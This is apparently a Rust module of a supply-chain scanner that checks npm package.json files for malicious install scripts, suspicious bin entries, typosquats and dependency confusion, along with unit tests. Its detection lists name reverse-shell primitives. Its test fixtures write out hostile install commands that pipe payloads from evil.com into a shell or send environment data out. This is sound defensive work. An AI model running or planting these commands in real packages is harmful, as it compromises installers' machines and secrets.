use serde_json::Value;
use std::collections::HashMap;
use std::path::Path;

/// A finding produced by package.json manifest analysis.
#[derive(Debug, Clone)]
pub struct ManifestFinding {
    pub rule_id: String,
    pub name: String,
    pub description: String,
    pub severity: String,
    pub file: String,
    pub detail: String,
}

/// Popular packages used as the reference set for typosquat detection.
const POPULAR_PACKAGES: &[&str] = &[
    "express",
    "react",
    "lodash",
    "axios",
    "chalk",
    "commander",
    "debug",
    "moment",
    "request",
    "underscore",
    "webpack",
    "babel",
    "typescript",
    "eslint",
    "prettier",
    "next",
    "vue",
    "angular",
    "jquery",
    "jest",
    "mocha",
    "dotenv",
    "cors",
    "body-parser",
    "mongoose",
    "sequelize",
    "pg",
    "mysql",
    "redis",
    "node-fetch",
    "form-data",
    "aws-sdk",
    "firebase",
    "graphql",
    "socket.io",
    "passport",
    "jsonwebtoken",
    "bcrypt",
    "helmet",
    "morgan",
    "winston",
    "pm2",
    "gulp",
    "rollup",
    "vite",
    "esbuild",
    "parcel",
    "svelte",
    "nuxt",
    "gatsby",
    "koa",
    "fastify",
    "hapi",
    "nest",
    // expanded top-downloads set for typosquat-at-scale
    "async", "bluebird", "rxjs", "yargs", "minimist", "glob", "rimraf", "mkdirp",
    "uuid", "nanoid", "semver", "ms", "qs", "ws", "got", "node-sass", "sass",
    "postcss", "autoprefixer", "tailwindcss", "bootstrap", "styled-components",
    "classnames", "immer", "redux", "react-redux", "react-router", "react-dom",
    "react-router-dom", "zustand", "formik", "yup", "zod", "joi", "ajv",
    "validator", "moment-timezone", "dayjs", "date-fns", "luxon", "chokidar",
    "nodemon", "concurrently", "cross-env", "dotenv-expand", "node-fetch",
    "isomorphic-fetch", "superagent", "undici", "cheerio", "puppeteer",
    "playwright", "jsdom", "ejs", "pug", "handlebars", "mustache", "marked",
    "highlight.js", "prismjs", "lodash.merge", "lodash.get", "ramda",
    "core-js", "regenerator-runtime", "tslib", "babel-core", "babel-loader",
    "ts-node", "ts-loader", "ts-jest", "esbuild", "terser", "uglify-js",
    "html-webpack-plugin", "css-loader", "style-loader", "file-loader",
    "mini-css-extract-plugin", "webpack-cli", "webpack-dev-server", "vite",
    "vitest", "cypress", "playwright-core", "supertest", "sinon", "chai",
    "enzyme", "testing-library", "nock", "msw", "faker", "chance",
    "express-session", "cookie-parser", "multer", "compression", "serve-static",
    "http-proxy-middleware", "socket.io-client", "ioredis", "mongodb", "mysql2",
    "sqlite3", "knex", "typeorm", "prisma", "nodemailer", "stripe", "twilio",
    "googleapis", "openai", "node-cron", "bull", "amqplib", "kafkajs",
    "log4js", "pino", "signale", "ora", "inquirer", "prompts", "boxen",
    "figlet", "cli-table3", "progress", "listr", "execa", "shelljs",
    "cross-spawn", "fs-extra", "graceful-fs", "del", "globby", "fast-glob",
    "chokidar-cli", "concurrently", "npm-run-all", "rollup", "snowpack",
    "tedious", "sharp", "jimp", "canvas", "pdfkit", "archiver", "adm-zip",
    "jszip", "tar", "node-forge", "crypto-js", "bcryptjs", "argon2",
    "jose", "passport-jwt", "express-validator", "helmet", "rate-limiter-flexible",
];

/// Install-lifecycle script keys that are commonly abused.
const INSTALL_SCRIPT_KEYS: &[&str] = &["preinstall", "install", "postinstall", "prepare", "preuninstall"];

/// Well-known benign native-build / tooling invocations. Install scripts that
/// consist of these are normal for thousands of legitimate packages and must
/// NOT be flagged on their own (only if they ALSO contain a malicious signal).
const BENIGN_INSTALL_TOOLS: &[&str] = &[
    "node-gyp", "prebuild-install", "node-pre-gyp", "prebuildify", "prebuild",
    "cmake-js", "neon", "napi", "tsc", "husky", "patch-package", "is-ci",
    "opencollective", "node-gyp-build", "install-app-deps", "electron-builder",
];

/// Analyze a package.json file at the given path and return all findings.
///
/// Returns an empty `Vec` if the file cannot be read or is not valid JSON.
/// Non-fatal parse issues are silently skipped so the scanner can continue.
pub fn analyze(path: &Path) -> Result<Vec<ManifestFinding>, ManifestError> {
    let contents = std::fs::read_to_string(path).map_err(|e| ManifestError::Io {
        path: path.display().to_string(),
        source: e,
    })?;

    analyze_contents(&contents, &path.display().to_string())
}

/// Analyze raw package.json contents. `file_label` is used in findings for the
/// `file` field (typically the file path).
pub fn analyze_contents(
    contents: &str,
    file_label: &str,
) -> Result<Vec<ManifestFinding>, ManifestError> {
    let root: Value =
        serde_json::from_str(contents).map_err(|e| ManifestError::InvalidJson {
            file: file_label.to_string(),
            source: e,
        })?;

    let obj = root
        .as_object()
        .ok_or_else(|| ManifestError::NotAnObject {
            file: file_label.to_string(),
        })?;

    let mut findings = Vec::new();

    check_install_scripts(obj, file_label, &mut findings);
    check_bin_entries(obj, file_label, &mut findings);

    let all_deps = collect_dependency_names(obj);
    check_typosquats(&all_deps, file_label, &mut findings);
    check_dependency_confusion(&all_deps, file_label, &mut findings);

    Ok(findings)
}

// ---------------------------------------------------------------------------
// Rule 1: Suspicious install scripts
// ---------------------------------------------------------------------------

/// Classification of an install-script command, most-severe first.
enum InstallVerdict {
    /// Downloads a remote resource and pipes/chains it into a shell.
    DownloadExecute(&'static str),
    /// Runs inline code via an interpreter eval flag (node -e, python -c, ...).
    InlineExec(&'static str),
    /// Contains obfuscated/encoded content (base64 blob, \x, fromCharCode).
    Obfuscated(&'static str),
    /// References a raw network URL during install (no clear download-exec).
    Network,
    /// Uses a raw shell/reverse-shell primitive.
    Shell(&'static str),
    /// Nothing suspicious.
    Clean,
}

/// Classify an install command. Benign native-build tooling (node-gyp etc.) is
/// only cleared when it carries NO malicious signal — `node-gyp rebuild && curl
/// evil | sh` is still caught because the download-execute check runs first.
fn classify_install_command(cmd: &str) -> InstallVerdict {
    let lower = cmd.to_ascii_lowercase();

    // 1. Download-and-execute: a fetcher combined with a shell pipe/chain or a
    //    URL. This is the canonical malicious-install pattern.
    let has_fetcher = ["curl ", "wget ", "fetch ", "invoke-webrequest", "iwr ", "certutil"]
        .iter()
        .any(|t| lower.contains(t));
    let pipes_to_shell = ["| sh", "|sh", "| bash", "|bash", "| node", "|node", "; sh", "&& sh", "&&sh"]
        .iter()
        .any(|t| lower.contains(t));
    if has_fetcher && (pipes_to_shell || lower.contains("http")) {
        return InstallVerdict::DownloadExecute("remote download piped into a shell");
    }
    if has_fetcher {
        return InstallVerdict::DownloadExecute("network fetch during install");
    }

    // 2. Inline code execution via interpreter eval flags.
    for flag in ["node -e", "node --eval", "node -p", "node --print", "python -c", "python3 -c", "ruby -e", "perl -e", "deno eval", "-encodedcommand", "powershell -e", "powershell -enc"] {
        if lower.contains(flag) {
            return InstallVerdict::InlineExec("inline code execution flag");
        }
    }

    // 3. Obfuscation / encoding inside the command.
    if lower.contains("base64 -d") || lower.contains("base64 --decode") || lower.contains("atob(")
        || lower.contains("fromcharcode") || cmd.contains("\\x") || cmd.contains("\\u00")
        || lower.contains("eval(")
    {
        return InstallVerdict::Obfuscated("encoded/eval payload in install script");
    }

    // From here on, a benign build-tool invocation with no further signal is OK.
    let is_benign_tool = BENIGN_INSTALL_TOOLS.iter().any(|t| lower.contains(t));

    // 4. Raw shell / reverse-shell primitives.
    for prim in ["/dev/tcp", "bash -i", "sh -i", "nc -e", "ncat -e", "bash -c", "sh -c", "/bin/sh", "/bin/bash", "cmd.exe", "netcat", "mkfifo"] {
        if lower.contains(prim) {
            return InstallVerdict::Shell("raw shell primitive");
        }
    }

    // 5. Network URL during install (informational unless build tool).
    if !is_benign_tool && (lower.contains("http://") || lower.contains("https://")) {
        return InstallVerdict::Network;
    }

    InstallVerdict::Clean
}

fn check_install_scripts(
    obj: &serde_json::Map<String, Value>,
    file: &str,
    findings: &mut Vec<ManifestFinding>,
) {
    let scripts = match obj.get("scripts").and_then(|v| v.as_object()) {
        Some(s) => s,
        None => return,
    };

    for &key in INSTALL_SCRIPT_KEYS {
        if let Some(Value::String(cmd)) = scripts.get(key) {
            let (rule_id, name, severity, why) = match classify_install_command(cmd) {
                InstallVerdict::DownloadExecute(w) => (
                    "MANIFEST-001",
                    "Malicious install script",
                    "critical",
                    w,
                ),
                InstallVerdict::InlineExec(w) => (
                    "MANIFEST-001",
                    "Malicious install script",
                    "critical",
                    w,
                ),
                InstallVerdict::Obfuscated(w) => (
                    "MANIFEST-005",
                    "Obfuscated install script",
                    "critical",
                    w,
                ),
                InstallVerdict::Shell(w) => (
                    "MANIFEST-001",
                    "Malicious install script",
                    "critical",
                    w,
                ),
                InstallVerdict::Network => (
                    "MANIFEST-006",
                    "Install script makes network request",
                    "high",
                    "references a remote URL during install",
                ),
                InstallVerdict::Clean => continue,
            };
            findings.push(ManifestFinding {
                rule_id: rule_id.to_string(),
                name: name.to_string(),
                description: format!(
                    "The \"{key}\" lifecycle script {why}. Install-time scripts run \
                     automatically on `npm install` and are the most common supply \
                     chain attack vector.",
                ),
                severity: severity.to_string(),
                file: file.to_string(),
                detail: format!("{key}: {cmd}"),
            });
        }
    }
}

// ---------------------------------------------------------------------------
// Rule 4: Suspicious bin entries
// ---------------------------------------------------------------------------

/// Patterns in bin entry paths/values that suggest malicious intent.
const SUSPICIOUS_BIN_PATTERNS: &[&str] = &[
    "node -e",
    "eval",
    "curl",
    "wget",
    "bash -c",
    "base64",
    "%2f",
    "%2F",
    "\\x",
    "\\u00",
];

fn check_bin_entries(
    obj: &serde_json::Map<String, Value>,
    file: &str,
    findings: &mut Vec<ManifestFinding>,
) {
    let bin_value = match obj.get("bin") {
        Some(v) => v,
        None => return,
    };

    // "bin" can be a string (single entry) or an object of name -> path mappings.
    let entries: Vec<(&str, &str)> = match bin_value {
        Value::String(s) => vec![("<default>", s.as_str())],
        Value::Object(map) => map
            .iter()
            .filter_map(|(k, v)| v.as_str().map(|s| (k.as_str(), s)))
            .collect(),
        _ => return,
    };

    for (bin_name, bin_path) in &entries {
        let lower = bin_path.to_ascii_lowercase();
        for &pattern in SUSPICIOUS_BIN_PATTERNS {
            if lower.contains(&pattern.to_ascii_lowercase()) {
                findings.push(ManifestFinding {
                    rule_id: "MANIFEST-004".to_string(),
                    name: "Suspicious bin entry".to_string(),
                    description: format!(
                        "The bin entry \"{bin_name}\" points to a path containing \
                         a suspicious pattern (\"{pattern}\") that may indicate a \
                         supply chain attack.",
                    ),
                    severity: "high".to_string(),
                    file: file.to_string(),
                    detail: format!("bin.{bin_name}: {bin_path}"),
                });
                // One finding per bin entry is enough.
                break;
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Rule 2: Typosquat detection via Levenshtein distance
// ---------------------------------------------------------------------------

/// Compute the Levenshtein edit distance between two strings.
fn levenshtein(a: &str, b: &str) -> usize {
    let a_len = a.len();
    let b_len = b.len();

    if a_len == 0 {
        return b_len;
    }
    if b_len == 0 {
        return a_len;
    }

    // Single-row optimisation: keep only the previous row.
    let mut prev: Vec<usize> = (0..=b_len).collect();
    let mut curr = vec![0usize; b_len + 1];

    for (i, ca) in a.chars().enumerate() {
        curr[0] = i + 1;
        for (j, cb) in b.chars().enumerate() {
            let cost = if ca == cb { 0 } else { 1 };
            curr[j + 1] = (prev[j] + cost)
                .min(prev[j + 1] + 1)
                .min(curr[j] + 1);
        }
        std::mem::swap(&mut prev, &mut curr);
    }

    prev[b_len]
}

/// Normalize a package name by removing separators so that separator-swap
/// typosquats ("lo-dash", "node_fetch", "cross.spawn") collapse onto the real
/// name. Lowercased; `.`, `-`, `_` stripped.
fn normalize_name(name: &str) -> String {
    name.chars()
        .filter(|c| *c != '-' && *c != '_' && *c != '.')
        .flat_map(|c| c.to_lowercase())
        .collect()
}

/// Maximum edit distance for a pair to be considered a potential typosquat.
fn typosquat_threshold(popular_name: &str, dep_name: &str) -> usize {
    let min_len = popular_name.len().min(dep_name.len());
    if min_len <= 5 {
        1
    } else {
        2
    }
}

fn check_typosquats(
    dep_names: &[String],
    file: &str,
    findings: &mut Vec<ManifestFinding>,
) {
    for dep in dep_names {
        // Strip optional scope for comparison (e.g. "@evil/lodash" -> "lodash").
        let bare = dep
            .strip_prefix('@')
            .and_then(|s| s.split_once('/'))
            .map(|(_, name)| name)
            .unwrap_or(dep.as_str());

        // Very short bare names collide too easily — skip them.
        if bare.len() < 4 {
            continue;
        }

        // Skip exact matches — those are the real packages.
        if POPULAR_PACKAGES.contains(&bare) {
            continue;
        }

        // Separator/punctuation trick: "lo-dash", "node_fetch", "cross.spawn"
        // normalize to a popular name while not matching it exactly.
        let norm_bare = normalize_name(bare);
        if let Some(popular) = POPULAR_PACKAGES
            .iter()
            .copied()
            .find(|p| normalize_name(p) == norm_bare && *p != bare)
        {
            findings.push(ManifestFinding {
                rule_id: "MANIFEST-002".to_string(),
                name: "Potential typosquat dependency".to_string(),
                description: format!(
                    "Dependency \"{dep}\" matches the popular package \"{popular}\" \
                     after normalizing separators — a common typosquat technique.",
                ),
                severity: "high".to_string(),
                file: file.to_string(),
                detail: format!("{dep} ~ {popular} (separator trick)"),
            });
            continue;
        }

        for &popular in POPULAR_PACKAGES {
            let threshold = typosquat_threshold(popular, bare);
            let dist = levenshtein(bare, popular);
            if dist > 0 && dist <= threshold {
                let severity = if dist == 1 { "high" } else { "medium" };
                findings.push(ManifestFinding {
                    rule_id: "MANIFEST-002".to_string(),
                    name: "Potential typosquat dependency".to_string(),
                    description: format!(
                        "Dependency \"{dep}\" is suspiciously similar to the popular \
                         package \"{popular}\" (edit distance {dist}).",
                    ),
                    severity: severity.to_string(),
                    file: file.to_string(),
                    detail: format!("{dep} ~ {popular} (distance {dist})"),
                });
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Rule 3: Dependency confusion risk
// ---------------------------------------------------------------------------

fn check_dependency_confusion(
    dep_names: &[String],
    file: &str,
    findings: &mut Vec<ManifestFinding>,
) {
    // Collect scoped package base names and check if an unscoped version of the
    // same name also appears. That is a classic dependency confusion setup.
    let mut scoped_bases: HashMap<&str, &str> = HashMap::new(); // base -> full scoped name
    let mut unscoped: Vec<&str> = Vec::new();

    for dep in dep_names {
        if let Some(rest) = dep.strip_prefix('@') {
            if let Some((scope, base)) = rest.split_once('/') {
                // @types/* packages are TypeScript type definitions, always
                // paired with the unscoped package — not confusion risk.
                if scope == "types" {
                    continue;
                }
                scoped_bases.insert(base, dep.as_str());
            }
        } else {
            unscoped.push(dep.as_str());
        }
    }

    // Flag any unscoped name that also appears as a scoped package base name.
    for name in &unscoped {
        if let Some(scoped) = scoped_bases.get(name) {
            findings.push(ManifestFinding {
                rule_id: "MANIFEST-003".to_string(),
                name: "Dependency confusion risk".to_string(),
                description: format!(
                    "Both the scoped package \"{scoped}\" and the unscoped package \
                     \"{name}\" are listed as dependencies. This pattern is a common \
                     indicator of dependency confusion attacks.",
                ),
                severity: "high".to_string(),
                file: file.to_string(),
                detail: format!("{scoped} vs {name}"),
            });
        }
    }

    // Also flag private-looking scoped packages whose base name matches a
    // popular public package — an attacker might publish the unscoped version.
    for &popular in POPULAR_PACKAGES {
        if let Some(scoped) = scoped_bases.get(popular) {
            // Already reported above if both exist; only flag solo scoped ones here.
            if !unscoped.contains(&popular) {
                findings.push(ManifestFinding {
                    rule_id: "MANIFEST-003".to_string(),
                    name: "Dependency confusion risk".to_string(),
                    description: format!(
                        "Scoped package \"{scoped}\" shares its base name with the popular \
                         public package \"{popular}\". If the scope is private, an attacker \
                         could publish a higher-version unscoped \"{popular}\" to hijack installs.",
                    ),
                    severity: "medium".to_string(),
                    file: file.to_string(),
                    detail: format!("{scoped} shadows {popular}"),
                });
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Collect all dependency names from every dependency-related key.
fn collect_dependency_names(obj: &serde_json::Map<String, Value>) -> Vec<String> {
    let dep_keys = [
        "dependencies",
        "devDependencies",
        "peerDependencies",
        "optionalDependencies",
        "bundledDependencies",
        "bundleDependencies",
    ];

    let mut names = Vec::new();

    for key in &dep_keys {
        if let Some(Value::Object(deps)) = obj.get(*key) {
            for name in deps.keys() {
                names.push(name.clone());
            }
        }
        // bundledDependencies can also be an array of strings.
        if let Some(Value::Array(arr)) = obj.get(*key) {
            for item in arr {
                if let Value::String(s) = item {
                    names.push(s.clone());
                }
            }
        }
    }

    // Deduplicate while preserving order.
    let mut seen = std::collections::HashSet::new();
    names.retain(|n| seen.insert(n.clone()));

    names
}

// ---------------------------------------------------------------------------
// Error type
// ---------------------------------------------------------------------------

/// Errors that can occur during manifest analysis.
#[derive(Debug)]
pub enum ManifestError {
    Io {
        path: String,
        source: std::io::Error,
    },
    InvalidJson {
        file: String,
        source: serde_json::Error,
    },
    NotAnObject {
        file: String,
    },
}

impl std::fmt::Display for ManifestError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ManifestError::Io { path, source } => {
                write!(f, "cannot read {path}: {source}")
            }
            ManifestError::InvalidJson { file, source } => {
                write!(f, "invalid JSON in {file}: {source}")
            }
            ManifestError::NotAnObject { file } => {
                write!(f, "{file}: top-level value is not a JSON object")
            }
        }
    }
}

impl std::error::Error for ManifestError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            ManifestError::Io { source, .. } => Some(source),
            ManifestError::InvalidJson { source, .. } => Some(source),
            ManifestError::NotAnObject { .. } => None,
        }
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_suspicious_postinstall() {
        let pkg = r#"{
            "name": "evil-pkg",
            "scripts": {
                "postinstall": "curl http://evil.com/payload | bash"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        assert!(!findings.is_empty());
        assert_eq!(findings[0].rule_id, "MANIFEST-001");
        assert_eq!(findings[0].severity, "critical");
    }

    #[test]
    fn ignores_node_gyp_rebuild() {
        // node-gyp / native build tooling is used by thousands of legit packages.
        for cmd in ["node-gyp rebuild", "prebuild-install || node-gyp rebuild", "node scripts/build.js", "tsc -p .", "husky install"] {
            let pkg = format!(r#"{{"name":"x","scripts":{{"postinstall":"{cmd}"}}}}"#);
            let findings = analyze_contents(&pkg, "package.json").unwrap();
            assert!(
                findings.iter().all(|f| !f.rule_id.starts_with("MANIFEST-00") || (f.rule_id != "MANIFEST-001" && f.rule_id != "MANIFEST-005" && f.rule_id != "MANIFEST-006")),
                "benign build tool '{cmd}' should not be flagged, got: {:?}",
                findings
            );
        }
    }

    #[test]
    fn detects_download_execute_install() {
        let pkg = r#"{"name":"x","scripts":{"preinstall":"curl https://evil.tld/p.sh | sh"}}"#;
        let f = analyze_contents(pkg, "package.json").unwrap();
        let m = f.iter().find(|x| x.rule_id == "MANIFEST-001").expect("download-exec");
        assert_eq!(m.severity, "critical");
    }

    #[test]
    fn detects_inline_node_eval_install() {
        let pkg = r#"{"name":"x","scripts":{"postinstall":"node -e \"require('http').get(process.env.X)\""}}"#;
        let f = analyze_contents(pkg, "package.json").unwrap();
        assert!(f.iter().any(|x| x.rule_id == "MANIFEST-001" && x.severity == "critical"));
    }

    #[test]
    fn detects_obfuscated_install() {
        let pkg = r#"{"name":"x","scripts":{"postinstall":"echo aGVsbG8= | base64 -d | sh"}}"#;
        let f = analyze_contents(pkg, "package.json").unwrap();
        assert!(f.iter().any(|x| x.rule_id == "MANIFEST-005" || x.rule_id == "MANIFEST-001"));
    }

    #[test]
    fn detects_separator_typosquat() {
        let pkg = r#"{"name":"app","dependencies":{"lo-dash":"^1.0.0","cross_env":"^1.0.0"}}"#;
        let f = analyze_contents(pkg, "package.json").unwrap();
        let typos: Vec<_> = f.iter().filter(|x| x.rule_id == "MANIFEST-002").collect();
        assert!(typos.iter().any(|x| x.detail.contains("lodash")), "lo-dash should map to lodash");
    }

    #[test]
    fn ignores_safe_scripts() {
        let pkg = r#"{
            "name": "safe-pkg",
            "scripts": {
                "postinstall": "echo done",
                "test": "jest"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        assert!(findings.is_empty());
    }

    #[test]
    fn detects_typosquat() {
        let pkg = r#"{
            "name": "app",
            "dependencies": {
                "loadsh": "^4.0.0"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let typo = findings.iter().find(|f| f.rule_id == "MANIFEST-002");
        assert!(typo.is_some(), "should detect 'loadsh' as typosquat of 'lodash'");
    }

    #[test]
    fn does_not_flag_exact_popular_name() {
        let pkg = r#"{
            "name": "app",
            "dependencies": {
                "axios": "^1.0.0",
                "react": "^18.0.0"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let typo = findings.iter().find(|f| f.rule_id == "MANIFEST-002");
        assert!(typo.is_none(), "exact matches should not be flagged");
    }

    #[test]
    fn detects_dependency_confusion() {
        let pkg = r#"{
            "name": "app",
            "dependencies": {
                "@myorg/utils": "^1.0.0",
                "utils": "^2.0.0"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let confusion = findings.iter().find(|f| f.rule_id == "MANIFEST-003");
        assert!(confusion.is_some(), "should detect dependency confusion risk");
        assert_eq!(confusion.unwrap().severity, "high");
    }

    #[test]
    fn detects_scoped_shadow_of_popular_package() {
        let pkg = r#"{
            "name": "app",
            "dependencies": {
                "@internal/lodash": "^1.0.0"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let shadow = findings
            .iter()
            .find(|f| f.rule_id == "MANIFEST-003" && f.detail.contains("shadows"));
        assert!(shadow.is_some(), "should flag scoped shadow of popular package");
        assert_eq!(shadow.unwrap().severity, "medium");
    }

    #[test]
    fn levenshtein_basic() {
        assert_eq!(levenshtein("", ""), 0);
        assert_eq!(levenshtein("abc", "abc"), 0);
        assert_eq!(levenshtein("abc", "ab"), 1);
        assert_eq!(levenshtein("kitten", "sitting"), 3);
        assert_eq!(levenshtein("axois", "axios"), 2);
        assert_eq!(levenshtein("recat", "react"), 2);
    }

    #[test]
    fn handles_invalid_json() {
        let result = analyze_contents("not json", "bad.json");
        assert!(result.is_err());
    }

    #[test]
    fn handles_non_object_json() {
        let result = analyze_contents("[1,2,3]", "array.json");
        assert!(result.is_err());
    }

    #[test]
    fn handles_empty_package() {
        let findings = analyze_contents("{}", "empty.json").unwrap();
        assert!(findings.is_empty());
    }

    #[test]
    fn detects_suspicious_bin_string() {
        let pkg = r#"{
            "name": "evil-cli",
            "bin": "node -e \"require('child_process').exec('bad')\""
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let bin_finding = findings.iter().find(|f| f.rule_id == "MANIFEST-004");
        assert!(bin_finding.is_some(), "should detect suspicious bin string");
        assert_eq!(bin_finding.unwrap().severity, "high");
    }

    #[test]
    fn detects_suspicious_bin_object() {
        let pkg = r#"{
            "name": "evil-cli",
            "bin": {
                "my-tool": "./scripts/setup.sh",
                "sneaky": "bash -c 'curl http://evil.com | sh'"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let bin_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id == "MANIFEST-004")
            .collect();
        assert!(
            !bin_findings.is_empty(),
            "should detect suspicious bin object entry"
        );
        // The "sneaky" entry should be flagged; "my-tool" is benign.
        assert!(
            bin_findings.iter().any(|f| f.detail.contains("sneaky")),
            "should flag the sneaky bin entry"
        );
    }

    #[test]
    fn ignores_safe_bin_entries() {
        let pkg = r#"{
            "name": "safe-cli",
            "bin": {
                "my-cli": "./bin/cli.js"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let bin_finding = findings.iter().find(|f| f.rule_id == "MANIFEST-004");
        assert!(bin_finding.is_none(), "safe bin entries should not be flagged");
    }

    #[test]
    fn detects_encoded_bin_path() {
        let pkg = r#"{
            "name": "encoded-cli",
            "bin": {
                "tool": "./bin/run%2Fsetup"
            }
        }"#;

        let findings = analyze_contents(pkg, "package.json").unwrap();
        let bin_finding = findings.iter().find(|f| f.rule_id == "MANIFEST-004");
        assert!(
            bin_finding.is_some(),
            "should detect encoded characters in bin path"
        );
    }
}
